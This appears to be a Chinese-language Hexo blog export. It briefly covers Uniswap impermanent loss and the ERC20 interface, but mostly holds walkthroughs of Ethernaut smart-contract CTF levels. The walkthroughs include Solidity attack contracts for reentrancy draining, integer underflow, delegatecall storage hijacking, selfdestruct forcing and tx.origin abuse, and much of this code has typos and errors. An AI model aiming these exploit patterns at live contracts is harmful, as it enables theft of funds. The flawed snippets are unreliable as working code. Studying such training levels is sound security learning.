这个恒定乘积的等式完成了链上自动做市。当然它也有一个特别大的缺点，就是随着池中B的减少，B的价格会越来越贵，和外部的价格越来越偏离了。为了解决这种偏离，套利者会通过其连续的套利活动将差异抹到可以忽略的地步。</p><p>那么是谁在支付这些收益。</p><p>Uniswap的项目方不可能支付这些利润。他们只是提供智能合约。</p><p>其他交易者如果发现池中价格比起外部价格存在差异，理性的行为是参与套利。</p><p>那么剩下来唯一支付这些利润的就是提供流动性的做市者了。他们的损失也正是套利者为了平衡内外价格而获得的利润。因此Uniswap通过交易手续费的方式，为流动性提供者进行了补偿。</p><p>Impermanent Loss<br>流动性提供者的损失是如何产生的？</p><p>来看一个简单的例子。</p><p>假如有池子ETH:USDT，假设流动性提供者按照当时的市场价格 1 ETH&#x3D;500 DAI 提供了 20个ETH 和10000个DAI。此时LP持有的资产价值&#x3D;10000 DAI +20ETH &#x3D; 20000 DAI。</p><p>过了一段时间，外部交易所的ETH 价格变化为 1 ETH&#x3D;550 DAI，而此时我们的池子还是维持 500 DAI 的价格。这就意味着出现一个套利机会。</p><p>套利者在池中支付DAI，获得ETH，并且在外部卖出，就可以获得无风险的差价。而套利本身将让池中的ETH&#x2F;DAI价格从500上升到550，这样套利机会也就消失了。</p><p>套利者需要付出488个DAI，提取0.93个ETH 就可以让池内价格变成550。套利者的利润则是0.93*550–488&#x3D;23.5 DAI。如果我们按照外部市场价计算LP手中的代币，那么总价值会是21000 DAI。但是池内经过套利平衡后，价格虽然和外部市场价一样，单价是两种代币的比例发生了变化,，因此总价值只有20976.59。</p><p>假设如果外部市场价格再一次回到了500，那么套利者可以通过支付0.93个ETH，获取488个DAI，让池内的价格ETH和DAI又回到了期初的状态。 LP此时又回到了最初的状态，没有亏损。</p><p>总结：<br>1只要流动性池的价格偏离外部价格，套利者总是可以无风险获得收益，LP则总是出现浮动亏损，最好的情况就是不亏损。</p><p>2只要LP不退出流动性池，那么当外部市场价格回到建立池的价格时，LP依然可以保留全部资产不亏损，所以LP的亏损是一个浮动的亏损，而非实际的亏损。</p><p>3 套利活动让价格趋于一致，代价就是LP付出了套利者的利润。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/08/05/ERC20/"/>
      <url>/2024/08/05/ERC20/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>是以太坊上的代币标准，它实现了代币转账的基本逻辑：</p><ul><li>账户余额(balanceOf())</li><li>转账(transfer())</li><li>授权转账(transferFrom())</li><li>授权(approve())</li><li>代币总供给(totalSupply())</li><li>授权转账额度(allowance())</li><li>代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())</li></ul><p>除了ERC20,还有它的接口合约IERC20，就是为了统一规范，以便好使用，接下来就介绍一下IERC20合约的功能</p><h2 id="俩个事件"><a href="#俩个事件" class="headerlink" title="俩个事件"></a>俩个事件</h2><ul><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>from</code>) 转账到另一账户 (<code>to</code>)时.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>owner</code>) 授权给另一账户 (<code>spender</code>）时.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="六个函数"><a href="#六个函数" class="headerlink" title="六个函数"></a>六个函数</h2><ul><li><code>totalSupply()</code>返回代币总供给<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>返回账户<code>account</code>所持有的代币数.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>转账 <code>amount</code> 单位代币，从调用者账户到另一账户 <code>to</code>,如果成功，返回 <code>true</code>,释放 {Transfer} 事件.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>返回<code>owner</code>账户授权给<code>spender</code>账户的额度，默认为0,当{approve} 或 {transferFrom} 被调用时，<code>allowance</code>会改变<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>调用者账户给<code>spender</code>账户授权 <code>amount</code>数量代币,如果成功，返回 <code>true</code>,释放 {Approval} 事件<br><code>function approve(address spender, uint256 amount) external returns (bool);</code></li><li><code>transferFrom()</code>通过授权机制，从<code>from</code>账户向<code>to</code>账户转账<code>amount</code>数量代币。转账的部分会从调用者的<code>allowance</code>中扣除。 如果成功，返回 <code>true</code>. 释放 {Transfer} 事件. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>以上须记住，以便好用</li></ul><p>说白了，它就是以太坊发行代币的一个标准，学会了如何实现ERC20，对入门区块链是很有帮助的</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut靶场题解</title>
      <link href="/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上不能部署这个合约，因为部署后，合约初始化，owner就是我们自己了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>直接使用合约地址<strong>At Adress</strong><br>2,调用contribute函数，转账1wei；<br>2,调用receive函数，转账1wei,就完成了,注意记得将钱收回来</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>分析：<br>注意这个的solidity的版本是0.6，没有影响关系，只是构造函数的写法不一样，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：直接部署不行，因为里面有其他的import，所以我们就外部调用这个合约，使用接口,另创建一个合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //观察所有者的地址是否为我们</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>要求是，连续猜对10次猜对硬币的结果</p><p>分析：就是要想办法调用flip()函数10次，让猜测的结果与side一致</p><p>方法：直接上攻击合约,在目标合约内,部署攻击合约，就是一样的调用目标合约的flip函数之后，得到的guess在进入一样的目标合约之中，这样我们的猜测值guess就与side一样了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//保证攻击合约中的guess与初始合约的side一样</span><br><span class="line">    &#125;</span><br><span class="line">  // 复制初始合约的flip()函数</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>要求是，获得该合约的所有权</p><p>分析：代码还是挺短的，主要就是弄懂<strong>tx.origin</strong>是什么意思，<strong>tx.origin</strong>是发起交易的账户，<strong>msg.sender</strong>是当前直接调用这个合约的即时账户，只要这俩者不一样就成功了<br>详细解释：</p><ul><li>A调用B合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;A</li></ul></li><li>A调用B合约，B合约调用C合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;B</li></ul></li></ul><p>方法：直接调用Telephone合约，不能满足条件，所以我们要写一个攻击合约来调用Telephone合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_target接受Telephone的地址，我们部署Hack合约，msg.sender就是我们的地址</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>要求是，我们有20个代币，需要让代币余额增加到20以上</p><p>分析：还是看solidity版本，0.6版本没有内置Safemath,所以就可以执行溢出或者下溢的操作  </p><blockquote><p>Safemath:在Solidity 中，SafeMath是一个常用的库，用于防止整数溢出和下溢的安全数学运算工具。由于Solidity的整数类型（如 uint 和int ）是有限的，当进行加法、减法、乘法或除法运算时，如果操作结果超出了类型范围，就会导致溢出或下溢<br>如，0-1会导致下溢，就会生成最大的无符号整数，并且大于0</p></blockquote><p>方法：调用攻击合约中，再调用transfer函数，给msg.sender转账1个代币，由于攻击合约没有代币，就会发生下溢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>要求是，获得这个合约的所有权</p><p>分析：理解<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,就是调用pwm函数，通过触发fallback函数，然后进行委托用</p><p>方法：部署Delegate合约，但是不调用，我们是在delegation合约上调用pwn函数</p><hr><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>要求是，使这个合约的余额大于零</p><p>分析：代码还是很简单，就是一个空合约，什么函数也没有，就考虑到自毁合约的功能  </p><blockquote><p>自毁合约：自毁合约是一种智能合约，通常基于区块链技术，其设计初衷是在特定条件下自动执行某些预定的操作，最终将合约自身的功能或者存储的资产销毁。这种合约的设计可以确保在特定情况发生时，例如某个时间点到达、某个条件达成或者特定的事件发生，合约内部的资产或者代码可以被永久删除或者无法访问。</p></blockquote><p>方法：使用通过selfdestructh功能删除一个合约，合约内所有的余额将被强制发送到另一个合约，就是写一个攻击合约自毁</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约时记得发送1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>要求是，解锁保险箱</p><p>分析：password是个私有变量，不能直接获取，但是它也是个状态变量，可以访问的，通过回到ethernaut网站，在控制台获得密码即可</p><p>方法：在控制台输入 <code>await web3.eth.getStorageAt(contract.address,1)</code>, 获得密码</p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>要求是，破坏游戏规则</p><p>分析：通过合约来看就是阻碍别人调用receive函数,拒接别人的转账,</p><p>方法：写一个攻击合约,不要有fallback,receive函数，防止新玩家转账，成为新国王</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行攻击合约时，首先检查当前的奖金值，然后部署攻击合约时，发送该奖金值</p><hr><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>要求是：窃取合约中的所有资金</p><p>分析：这是一个典型的重入攻击  </p><blockquote><p>重入攻击：重入攻击的典型示例是以太坊的智能合约中发生的情况。以太坊的智能合约是按照以太币（ETH）的传统交易方式执行的，合约可以调用其他合约或发送ETH到外部账户。如果一个合约在调用外部合约时先转移ETH给另一个合约，并且在接收ETH后再执行其他逻辑，那么这个外部合约可以在接收ETH后调用原合约，重新执行发送ETH的逻辑，导致重复的ETH转移，从而造成资金损失。<br>通过不断调用withdraw函数,窃取资金</p></blockquote><p>方法: 写一个攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约,调用attack函数发送1ether,即可</p><hr><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>要求是,到达建筑物的顶楼</p><p>分析:第一次的building.isLastFloor(_floor)要为false,满足if的条件,第二次的building.isLastFloor(_floor)要为ture,使电梯到楼顶</p><p>方法: 就是在攻击合约中写isLastFloor函数,达到要求,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>要求是,解锁该合约</p><p>分析:就是将locked初始值ture,改为false,调用unlock函数</p><p>方法: 首先要知道每个私有状态可变的储存slot,如图:<br>![这是图片](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg slot)<br>再使用Web库来获取这个数据,然后截取为16字节,即为密钥,再调用unlock函数,将其作为参数传递即可</p><hr><h2 id="Naugth-Coin"><a href="#Naugth-Coin" class="headerlink" title="Naugth Coin"></a>Naugth Coin</h2><p>要求是,将代币余额变为零</p><p>分析:难点有个时间锁,在转移代币时,必须等待10年,所以就思考其他的方法,然后就是熟悉ERC20合约,目标合约importl了ERC20,后面的攻击合约也要使用,建议先熟悉ERC20合约再来解题,我这就直接上攻击合约</p><p>方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solodity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface INaughtCoin &#123;</span><br><span class="line"> function player() external view returns(address);</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"> function balanceof(address account) external view returns (uint256);function approve(address spender, uint256 amount) external returns(bool);</span><br><span class="line"> function transferFrom(address sender,address recipient, uint256 amount)extlernal;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  //deploy</span><br><span class="line">  //coin.approve(hack,amount)</span><br><span class="line">  //pwn</span><br><span class="line">  function pwn(IERC20 coin) external &#123;</span><br><span class="line">    address player = INaughtCoin(address(coin)).player;</span><br><span class="line">    uint bal = coin.balanceOf(player);</span><br><span class="line">    coin.transferFrom(player,address(this),bal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>要求是,获得该合约的所有权</p><p>分析:委托调用,注意看函数签名,<code>bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;))</code>,当我们调用setFirstTime函数时,委托调用会执行setTime函数,此时timeZone1Library的地址将会更新,如果我们再次调用setFirstTime函数,又更新地址,这样就能成为owner</p><p>方法:还是写一个攻击合约,进行调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint256 storedTime;</span><br><span class="line"></span><br><span class="line">  function attack(Preservation target) external &#123;</span><br><span class="line">    target.setFistTime(uint256(uint160(address this)));</span><br><span class="line">    target.setFistTime(uint256(uint160(msg.sender)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _owner) external &#123;</span><br><span class="line">    owner = address(uint160(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>要求是,恢复丢失的0.001以太币</p><p>分析:这是一个工厂合约,由于不知道代币的地址,无法找到丢失的以太币,所以我们的任务是找到这个代币合约的地址,然后进行自毁合约,有俩种方法找到代币合约的地址,一是通过区块链浏览器Etherscan,查询调用generate Token交易,找到代币合约地址,二是通过计算,在Ethereum Stack Exchange上可以查询计算方式</p><p>方法:采用计算地址的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dev&#123;</span><br><span class="line">  function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">    address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01))))));</span><br><span class="line">    return addr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="MagicNunmber"><a href="#MagicNunmber" class="headerlink" title="MagicNunmber"></a>MagicNunmber</h2><p>要求是,调用whatIsTheMeaningOfLife()函数,并且返回数字42,但是攻击合约不能超过10个合约</p><p>分析:如果直接调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">   function whatIsTheMeaningOfLife() external pure returns (uint)&#123;</span><br><span class="line">    return 42;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约将超过10个合约码,不符合要求,这时就使用汇编编写一个智能合约,然后手动部署代码(本人还在学习汇编语言)</p><hr><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>要求是,在所有者在调用withdraw函数时拒绝其提取资金</p><p>分析:这题大概思路很好懂,就是如何去实现拒绝转账这步要思考一下,又是要用到汇编语言,等我学习后再来补题解</p><hr><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>要求是，以低于要价的价格从商店购买物品</p><p>分析：就是使状态变量isSold等于true，而且还要使价格低于100，目标合约已经给了一个接口，就是就是在调用这个接口的时候满足要求，第一次调用的时候，要使价格高于100，满足if的条件，第二次调用的时候price就设置低于100的价格即可</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  Shop private immutable target;</span><br><span class="line"></span><br><span class="line">   constructor (address _target)&#123;</span><br><span class="line">    target = Shop(_target);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function pwn() external &#123;</span><br><span class="line">    target.buy();</span><br><span class="line">   &#125;</span><br><span class="line">   function price() external view returns (uint256)&#123;</span><br><span class="line">    //利用第一次返回isSold为ture来区分第几次调用</span><br><span class="line">    if(isSold)</span><br><span class="line">      return 99;</span><br><span class="line">    else</span><br><span class="line">      return 100;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场题解</title>
      <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>首先找到owner，</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，<br>这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上部署这个合约，首先调用contribute函数，给我们转账；<br>2，在调用receive函数，就完成了</p><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>从这个题目来看，Fallout,Fal1out,</p><p>分析：<br>首先看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：</p><p>定义函数接口，直接调用该函数Fal1out,此时就成为了合约的所有者</p>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="先进入blog-cd-blog"><a href="#先进入blog-cd-blog" class="headerlink" title="先进入blog         cd blog"></a>先进入blog         cd blog</h2><h2 id="预览hexo-hexo-s"><a href="#预览hexo-hexo-s" class="headerlink" title="预览hexo             hexo s"></a>预览hexo             hexo s</h2><h2 id="创建文章题目-hexo-new-“”"><a href="#创建文章题目-hexo-new-“”" class="headerlink" title="创建文章题目        hexo new “”"></a>创建文章题目        hexo new “”</h2><h2 id="进入文章目录-cd-提目前，blog后的东西）题目-md"><a href="#进入文章目录-cd-提目前，blog后的东西）题目-md" class="headerlink" title="进入文章目录        cd   提目前，blog后的东西）题目.md"></a>进入文章目录        cd   提目前，blog后的东西）题目.md</h2><h2 id="写文章-notepad-题目-md"><a href="#写文章-notepad-题目-md" class="headerlink" title="写文章                  notepad 题目.md"></a>写文章                  notepad 题目.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
